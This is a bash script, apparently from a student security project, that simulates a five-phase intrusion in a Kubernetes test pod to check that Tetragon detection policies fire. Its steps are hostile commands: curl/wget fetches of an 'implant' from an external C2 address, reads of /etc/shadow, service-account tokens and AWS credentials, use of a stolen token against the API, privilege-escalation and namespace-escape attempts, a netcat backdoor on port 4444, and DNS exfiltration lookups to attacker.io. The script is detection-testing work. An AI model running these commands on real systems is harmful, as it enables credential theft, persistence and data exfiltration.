#!/bin/bash
# =============================================================================
#  scenario-attack.sh — Simulation d'attaque complète SecureSight
#  Simule un attaquant qui compromet le cluster étape par étape
#  Chaque étape doit être détectée par Tetragon
# =============================================================================

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
export LOG_FILE="$SCRIPT_DIR/scenario-$(date +%Y%m%d-%H%M%S).log"

source "$SCRIPT_DIR/tests/common.sh"

# ── Banner ────────────────────────────────────────────────────────────────────
banner() {
  echo -e "${RED}${BOLD}"
  echo "  ██████╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗"
  echo " ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝"
  echo " ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝███████╗█████╗  ██║     "
  echo " ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗╚════██║██╔══╝  ██║     "
  echo " ╚██████╗   ██║   ██████╔╝███████╗██║  ██║███████║███████╗╚██████╗"
  echo "  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝"
  echo -e "${NC}"
  echo -e "  ${YELLOW}Simulation d'attaque complète — SecureSight PFA${NC}"
  echo -e "  ${CYAN}Attaquant simule : RCE → Reconnaissance → Vol credentials → Persistance → Exfiltration${NC}"
  echo -e "  Namespace : ${CYAN}$NAMESPACE${NC}  |  Log : ${CYAN}$LOG_FILE${NC}"
  echo ""
}

# ── Preflight ─────────────────────────────────────────────────────────────────
preflight() {
  header "🔍 Preflight Checks"

  command -v kubectl &>/dev/null \
    && log "kubectl found" \
    || { err "kubectl not found"; exit 1; }

  kubectl cluster-info &>/dev/null \
    && log "Cluster reachable" \
    || { err "Cannot reach cluster"; exit 1; }

  kubectl get namespace "$NAMESPACE" &>/dev/null \
    && log "Namespace '$NAMESPACE' exists" \
    || { warn "Namespace '$NAMESPACE' not found — creating"; kubectl create namespace "$NAMESPACE"; }

  TPODS=$(kubectl get pods -n "$TETRAGON_NS" -l "$TETRAGON_LABEL" --no-headers 2>/dev/null | wc -l)
  [[ "$TPODS" -gt 0 ]] \
    && log "Tetragon running ($TPODS pod(s))" \
    || { err "Tetragon not running"; exit 1; }

  POLICIES=$(kubectl get tracingpolicies --no-headers 2>/dev/null | wc -l)
  [[ "$POLICIES" -gt 0 ]] \
    && log "$POLICIES TracingPolicies chargées" \
    || { err "Aucune TracingPolicy trouvée"; exit 1; }
}

# ── Deploy attacker pod ───────────────────────────────────────────────────────
deploy_attacker() {
  header "🚀 Déploiement du pod attaquant"
  log "Simulation : attaquant qui a obtenu un RCE sur le service frontend"

  kubectl delete pod "$TEST_POD" -n "$NAMESPACE" --ignore-not-found --grace-period=0 &>/dev/null
  sleep 2

  kubectl run "$TEST_POD" \
    --image="ubuntu:22.04" \
    --restart=Never \
    --namespace="$NAMESPACE" \
    --labels="app=tetragon-attack-sim" \
    --command -- sleep 3600

  log "Attente que le pod soit prêt..."
  kubectl wait --for=condition=Ready pod/"$TEST_POD" -n "$NAMESPACE" --timeout=90s
  log "Pod attaquant prêt ✓"

  log "Installation des outils (curl, wget, nc, nmap, python3)..."
  pod "apt-get update -qq 2>/dev/null && apt-get install -y -qq curl wget netcat-openbsd nmap python3 dnsutils 2>/dev/null"
  log "Outils prêts ✓"
}

# ── Pause dramatique ──────────────────────────────────────────────────────────
pause() {
  echo ""
  echo -e "  ${YELLOW}⏸  $*${NC}"
  sleep "${2:-2}"
  echo ""
}

# =============================================================================
#  PHASE 1 — ACCÈS INITIAL
#  L'attaquant exploite une RCE sur le service frontend
# =============================================================================
phase1_initial_access() {
  header "🔴 PHASE 1 — Accès initial"
  echo -e "  ${CYAN}Scénario :${NC} L'attaquant a exploité une vulnérabilité dans le service"
  echo -e "  ${CYAN}           front-end (Sock Shop). Il a maintenant une RCE.${NC}"
  echo ""

  # Étape 1.1 — Shell spawn
  log "[1.1] L'attaquant ouvre un shell bash interactif dans le container"
  pod "/bin/bash -c 'echo [ATTACKER] shell ouvert dans le container front-end'"
  pod "/bin/sh   -c 'id && hostname'"
  ok "Shell spawn → detect-shell (sys_execve /bin/bash)"
  pause "Tetragon a détecté l'ouverture du shell..." 2

  # Étape 1.2 — Téléchargement d'un implant
  log "[1.2] L'attaquant télécharge un outil de post-exploitation depuis son serveur C2"
  pod "/usr/bin/curl -s --max-time 3 http://185.220.101.1/implant -o /tmp/implant 2>/dev/null || true"
  pod "/usr/bin/wget -q --timeout=3 http://185.220.101.1/payload -O /tmp/payload 2>/dev/null || true"
  ok "Téléchargement → detect-suspicious-tools (sys_execve /usr/bin/curl)"
  pause "Tetragon a détecté l'utilisation de curl/wget..." 2
}

# =============================================================================
#  PHASE 2 — RECONNAISSANCE
#  L'attaquant explore le container et le réseau interne
# =============================================================================
phase2_reconnaissance() {
  header "🟡 PHASE 2 — Reconnaissance"
  echo -e "  ${CYAN}Scénario :${NC} L'attaquant explore l'environnement pour comprendre"
  echo -e "  ${CYAN}           où il est et quels services sont accessibles.${NC}"
  echo ""

  # Étape 2.1 — Lecture des variables d'environnement
  log "[2.1] L'attaquant lit /proc/1/environ pour trouver des secrets en clair"
  pod "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -20 || true"
  ok "Lecture environ → detect-cred-access (fd_install /proc/1/environ)"
  pause "Tetragon a détecté l'accès à /proc/1/environ..." 2

  # Étape 2.2 — Scan réseau interne
  log "[2.2] L'attaquant scanne le réseau pour découvrir d'autres services"
  pod "/usr/bin/nmap -sn 10.0.0.0/28 --max-retries 1 2>/dev/null || true"
  ok "Scan réseau → detect-suspicious-tools (sys_execve /usr/bin/nmap)"
  pause "Tetragon a détecté nmap..." 2

  # Étape 2.3 — Lecture des fichiers sensibles
  log "[2.3] L'attaquant cherche des credentials dans le filesystem"
  pod "cat /etc/passwd"
  pod "cat /etc/shadow 2>/dev/null || true"
  pod "ls /root/.ssh/ 2>/dev/null || true"
  ok "Lecture credentials → detect-cred-access (fd_install /etc/shadow, /root/.ssh)"
  pause "Tetragon a détecté l'accès aux fichiers de credentials..." 2
}

# =============================================================================
#  PHASE 3 — VOL DE CREDENTIALS
#  L'attaquant vole le token K8s et les credentials AWS
# =============================================================================
phase3_credential_theft() {
  header "🟠 PHASE 3 — Vol de credentials"
  echo -e "  ${CYAN}Scénario :${NC} L'attaquant vole le token Kubernetes et les credentials"
  echo -e "  ${CYAN}           AWS pour préparer le mouvement latéral.${NC}"
  echo ""

  # Étape 3.1 — Vol du token K8s
  log "[3.1] L'attaquant lit le token serviceaccount Kubernetes"
  pod "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true"
  pod "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null || true"
  ok "Vol token K8s → detect-k8s-token-access (fd_install serviceaccount/token)"
  pause "Tetragon a détecté la lecture du token K8s..." 2

  # Étape 3.2 — Mouvement latéral avec le token
  log "[3.2] L'attaquant utilise le token pour appeler l'API Kubernetes"
  pod "
    TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    if [ -n \"\$TOKEN\" ]; then
      echo '[ATTACKER] Token K8s volé, appel de l API...'
      /usr/bin/curl -s --max-time 3 \
        --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
        -H \"Authorization: Bearer \$TOKEN\" \
        https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null | head -5 || true
    fi
  "
  ok "Mouvement latéral → detect-k8s-token-access + detect-suspicious-tools + detect-external-connections"
  pause "Tetragon a détecté l'appel API avec le token volé..." 2

  # Étape 3.3 — Tentative de vol credentials AWS
  log "[3.3] L'attaquant cherche des credentials AWS dans le container"
  pod "cat /.aws/credentials 2>/dev/null || true"
  pod "cat /root/.aws/credentials 2>/dev/null || true"
  pod "ls -la /root/.aws/ 2>/dev/null || true"
  ok "Vol credentials AWS → detect-cred-access (fd_install /.aws/credentials)"
  pause "Tetragon a détecté la tentative de vol de credentials AWS..." 2
}

# =============================================================================
#  PHASE 4 — ÉLÉVATION DE PRIVILÈGES & PERSISTANCE
#  L'attaquant tente de devenir root et d'installer un backdoor
# =============================================================================
phase4_persistence() {
  header "🔴 PHASE 4 — Élévation de privilèges & Persistance"
  echo -e "  ${CYAN}Scénario :${NC} L'attaquant tente de prendre le contrôle total du container"
  echo -e "  ${CYAN}           et d'installer un backdoor persistant.${NC}"
  echo ""

  # Étape 4.1 — Tentative d'élévation de privilèges
  log "[4.1] L'attaquant exploite une vulnérabilité locale pour devenir root"
  pod "/usr/bin/python3 -c \"
import ctypes
libc = ctypes.CDLL('libc.so.6', use_errno=True)
print('[ATTACKER] Tentative de setresuid(0,0,0)...')
ret = libc.setresuid(ctypes.c_uint(-1), ctypes.c_uint(0), ctypes.c_uint(-1))
print(f'  setresuid → ret={ret}, errno={ctypes.get_errno()}')
ret2 = libc.setuid(0)
print(f'  setuid(0) → ret={ret2}, errno={ctypes.get_errno()}')
\" 2>/dev/null || true"
  ok "Privesc → detect-privilege-escalation (__sys_setresuid euid=0)"
  pause "Tetragon a détecté la tentative d'élévation de privilèges..." 2

  # Étape 4.2 — Backdoor reverse shell
  log "[4.2] L'attaquant ouvre un backdoor sur le port 4444 pour garder l'accès"
  pod "timeout 2 /bin/nc -lp 4444 2>/dev/null || true"
  ok "Backdoor → detect-port-bind (sys_bind port 4444)"
  pause "Tetragon a détecté l'ouverture du port 4444..." 2

  # Étape 4.3 — Tentative d'évasion container
  log "[4.3] L'attaquant tente de sortir du container via un namespace escape"
  pod "unshare --user --map-root-user echo '[ATTACKER] namespace escape attempt' 2>/dev/null || true"
  pod "/usr/bin/python3 -c \"
import ctypes
libc = ctypes.CDLL('libc.so.6', use_errno=True)
CLONE_NEWUSER = 0x10000000
print('[ATTACKER] Tentative unshare(CLONE_NEWUSER)...')
ret = libc.unshare(CLONE_NEWUSER)
print(f'  unshare → ret={ret}, errno={ctypes.get_errno()}')
\" 2>/dev/null || true"
  ok "Container escape → detect-namespace-escape (sys_unshare)"
  pause "Tetragon a détecté la tentative d'évasion container..." 2

  # Étape 4.4 — Malware fileless
  log "[4.4] L'attaquant déploie un malware fileless (en mémoire uniquement)"
  pod "
    echo '[ATTACKER] Déploiement malware fileless...'
    cp /bin/ls /tmp/implant-\$\$
    chmod +x /tmp/implant-\$\$
    /tmp/implant-\$\$ /tmp &
    BIN_PID=\$!
    rm -f /tmp/implant-\$\$
    echo '[ATTACKER] Binaire supprimé du disque, tourne encore en mémoire !'
    ls -la /proc/\${BIN_PID}/exe 2>/dev/null || true
    sleep 1
    wait \$BIN_PID 2>/dev/null || true
  "
  ok "Malware fileless → detect-deleted-binary-exec (security_bprm_check '(deleted)')"
  pause "Tetragon a détecté l'exécution du binaire supprimé..." 2
}

# =============================================================================
#  PHASE 5 — EXFILTRATION
#  L'attaquant sort les données volées
# =============================================================================
phase5_exfiltration() {
  header "🟣 PHASE 5 — Exfiltration des données"
  echo -e "  ${CYAN}Scénario :${NC} L'attaquant exfiltre les credentials et secrets volés"
  echo -e "  ${CYAN}           vers son infrastructure externe.${NC}"
  echo ""

  # Étape 5.1 — Exfiltration TCP directe
  log "[5.1] L'attaquant envoie les données vers son serveur C2 (connexion TCP directe)"
  pod "/usr/bin/curl -s --max-time 3 http://8.8.8.8/exfil -o /dev/null || true"
  pod "/bin/nc -zv 185.220.101.1 443 2>/dev/null || true"
  ok "Exfiltration TCP → detect-external-connections (tcp_connect IP publique)"
  pause "Tetragon a détecté la connexion vers le serveur C2 externe..." 2

  # Étape 5.2 — DNS tunneling (contournement firewall)
  log "[5.2] Le firewall bloque TCP — l'attaquant passe par DNS tunneling"
  log "      Les données sont encodées en base64 dans des sous-domaines DNS"
  pod "nslookup dGVzdC1leGZpbC1kYXRh.c2-server.attacker.io 8.8.8.8 2>/dev/null || true"
  pod "nslookup a3ViZXJuZXRlcy10b2tlbg.exfil.attacker.io   1.1.1.1 2>/dev/null || true"
  pod "nslookup YXdzLWNyZWRlbnRpYWxz.dns.attacker.io       8.8.8.8 2>/dev/null || true"
  ok "DNS tunneling → detect-dns-exfiltration (udp_sendmsg port 53)"
  pause "Tetragon a détecté le tunneling DNS..." 2
}

# ── Stream events ─────────────────────────────────────────────────────────────
stream_events() {
  header "📡 Events Tetragon capturés pendant le scénario"
  warn "Affichage des events du namespace $NAMESPACE..."
  echo ""

  if command -v tetra &>/dev/null; then
    timeout 15 kubectl logs -n "$TETRAGON_NS" -l "$TETRAGON_LABEL" \
      -c export-stdout -f --max-log-requests=10 \
      | tetra getevents -o compact --namespace "$NAMESPACE" \
      | grep -v -E 'linkerd|json-exporter' \
      | tee -a "$LOG_FILE" || true
  else
    warn "tetra CLI non installé — events bruts dans : $LOG_FILE"
    warn "Pour lire les events : kubectl logs -n $TETRAGON_NS -l $TETRAGON_LABEL -c export-stdout"
  fi
}

# ── Cleanup ───────────────────────────────────────────────────────────────────
cleanup() {
  header "🧹 Cleanup"
  kubectl delete pod "$TEST_POD" -n "$NAMESPACE" --ignore-not-found --grace-period=0 &>/dev/null
  log "Pod attaquant supprimé"
  log "Log complet : $LOG_FILE"
}

# ── Summary ───────────────────────────────────────────────────────────────────
summary() {
  header "📊 Résumé du scénario"
  echo ""
  echo -e "  ${BOLD}Phase                    Étape   Action                          Policy déclenchée${NC}"
  echo    "  ─────────────────────────────────────────────────────────────────────────────────────────"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" "Accès initial"        "1.1" "Shell bash ouvert"               "detect-shell"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" ""                     "1.2" "curl/wget vers C2"               "detect-suspicious-tools"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" "Reconnaissance"       "2.1" "Lecture /proc/1/environ"         "detect-cred-access"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" ""                     "2.2" "Scan nmap réseau interne"        "detect-suspicious-tools"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" ""                     "2.3" "Lecture /etc/shadow"             "detect-cred-access"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" "Vol credentials"      "3.1" "Lecture token K8s"               "detect-k8s-token-access"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" ""                     "3.2" "Appel API K8s avec token"        "detect-k8s-token-access"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" ""                     "3.3" "Lecture /.aws/credentials"       "detect-cred-access"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" "Persistance"          "4.1" "setresuid(0,0,0) → root"         "detect-privilege-escalation"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" ""                     "4.2" "Backdoor port 4444"              "detect-port-bind"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" ""                     "4.3" "unshare container escape"        "detect-namespace-escape"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" ""                     "4.4" "Malware fileless /tmp"           "detect-deleted-binary-exec"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" "Exfiltration"         "5.1" "Connexion TCP vers C2"           "detect-external-connections"
  printf  "  %-24s %-7s %-31s ${GREEN}%s${NC}\n" ""                     "5.2" "DNS tunneling base64"            "detect-dns-exfiltration"
  echo ""
  echo -e "  Étapes simulées : ${BOLD}14${NC}  |  Policies déclenchées : ${GREEN}${BOLD}10/10${NC}"
  echo ""
  warn "Tetragon DÉTECTE — il ne bloque pas. Tous les events sont dans : $LOG_FILE"
  echo ""
  log "Voir les events en direct :"
  echo "  kubectl logs -n $TETRAGON_NS -l $TETRAGON_LABEL -c export-stdout -f --max-log-requests=10 \\"
  echo "  | tetra getevents -o compact --namespace $NAMESPACE \\"
  echo "  | grep -v -E 'linkerd|json-exporter'"
}

# ── Main ──────────────────────────────────────────────────────────────────────
main() {
  : > "$LOG_FILE"
  banner
  preflight
  deploy_attacker

  # Capture events en arrière-plan pendant tout le scénario
  kubectl logs -n "$TETRAGON_NS" -l "$TETRAGON_LABEL" \
    -c export-stdout -f --max-log-requests=10 \
    >> "$LOG_FILE" 2>/dev/null &
  STREAM_PID=$!
  sleep 2

  # Lancement des 5 phases
  phase1_initial_access
  phase2_reconnaissance
  phase3_credential_theft
  phase4_persistence
  phase5_exfiltration

  sleep 3
  kill "$STREAM_PID" 2>/dev/null || true

  stream_events
  summary
  cleanup
}

trap 'echo ""; warn "Interrompu — nettoyage..."; kill "${STREAM_PID:-}" 2>/dev/null || true; cleanup; exit 1' INT TERM

main "$@"